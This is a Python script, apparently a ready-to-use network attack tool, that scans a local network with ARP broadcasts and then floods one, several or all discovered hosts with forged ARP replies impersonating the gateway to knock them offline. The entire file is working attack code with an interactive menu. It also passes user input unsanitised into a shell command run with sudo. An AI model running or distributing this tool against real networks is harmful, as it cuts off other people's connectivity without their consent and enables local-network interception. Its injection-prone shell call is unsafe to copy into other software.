# -*- coding: utf-8 -*-

import datetime
import logging
import psutil
import socket
import shlex
import subprocess
import sys
import time

import os
from requests import get
from scapy.all import srp, Ether, ARP, conf, send, socket

list_of_ips = []

def main():

    print("Hello there, select attack method:\n")

    if os.geteuid() != 0:
        print("This script need root privilege")
        exit(0)

    attackMode = menu()

    try:
        print("")
        interfaces = psutil.net_if_addrs()
        for i in interfaces.keys():
            print(i + " :: " + interfaces[i][0][1])
        print("")

        iface = ""
        while iface not in interfaces.keys():
            iface = input("[*] Select interface: ")

    except KeyboardInterrupt:
        print("\n[*] KeyboardInterrupt requested...")
        print("[*] Quitting...")
        sys.exit(1)
    
    netmask= interfaces[iface][0][2]
    rangeOfIp = str(interfaces[iface][0][1]) + "/" + str(sum([bin(int(x)).count('1') for x in netmask.split('.')]))
    scan(iface, rangeOfIp)
    attack(attackMode, iface)

def menu():
    print("1) Kick one device\n")
    print("2) Kick some devices\n")
    print("3) Kick all devices\n")

    while True:
        try:
            choice = input(">> ")
            attackMode = int(choice)
            if attackMode > 3 or attackMode < 1:
                print("[-] Pls enter a number from 1 to 3\n")
            else:
                return attackMode

        except Exception as Err:
            print("[-] Pls enter a number\n")

def scan(iface, ips):
    print("[*] Scanning...\n")

    global list_of_ips
    start_scan = datetime.datetime.now()
    conf.verb = 0
    try:
        ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ips),
            iface=iface, timeout=2, inter=0.1)

    except Exception as Error:
        print("[-] No such device: " + iface )
        print('Or')
        print("[-] Range of IP not known: " + ips)
        exit(0)

    try:
        for s,r in ans:
            dstmac = (r[Ether].src)
            try:
                url = "http://api.macvendors.com/"+str(dstmac)
                vendor = get(url).text
            except:
                vendor = "Unknown"
            print(r.sprintf(r"%Ether.src% - %ARP.psrc%" + "   " + vendor))
            gateway = get_gateway(iface)
            if not r.sprintf(r"%ARP.psrc%") == gateway:
                list_of_ips.append(r.sprintf(r"%ARP.psrc%"))
    except Exception as Err:
        print(Err)

    stop_scan = datetime.datetime.now()
    print("\n[*] Scan completed")
    time_scan = stop_scan - start_scan
    print("[*] Scan duration :: " + str(time_scan))

def get_gateway(wlan: str = None):
    if wlan:
        s = subprocess.check_output(
            "sudo cat /proc/net/arp | grep " + wlan,
            shell=True
        )
        return s.decode().split(" ", 1)[0]
    print("[-] Failed to get gateway IP. Need /proc/net/arp access.")
    sys.exit(1)

def attack(attackMode, iface):
    target = []
    global list_of_ips

    gateway = get_gateway(iface)
    print("[+] Gateway ip: " + gateway)

    if attackMode == 1:
        newtarget = input("[>] Choose target ip: ")
        target.append(newtarget)

    if attackMode == 2:
        newtarget = input("[>] Choose ips (separate with ,): ")
        for t in newtarget.split(','):
            target.append(t)

    if attackMode == 3:
        targets = ""
        for t in list_of_ips:
            target.append(t)
        for i in target:
            if i != 'None':
                targets += i + " "
        print("[*] Starting attack mode All. List of ips now: " + targets)

    column = 0
    while True:
        try:
            for i in target:
                if i != 'None':
                    packet = ARP(op=2, psrc=gateway, hwsrc='12:34:56:78:9A:BC', pdst=i)
                    send(packet, verbose=0)
                    column += 1

                    print("[+] Sended " + str(column) + " packets to " + i + "!")

            time.sleep(1)

        except KeyboardInterrupt:
            print("\n[*] KeyboardInterrupt requested...")
            print("[+] Attack done! :)")
            print("[*] Quitting...")
            sys.exit(1)

if __name__ == '__main__':
    main()
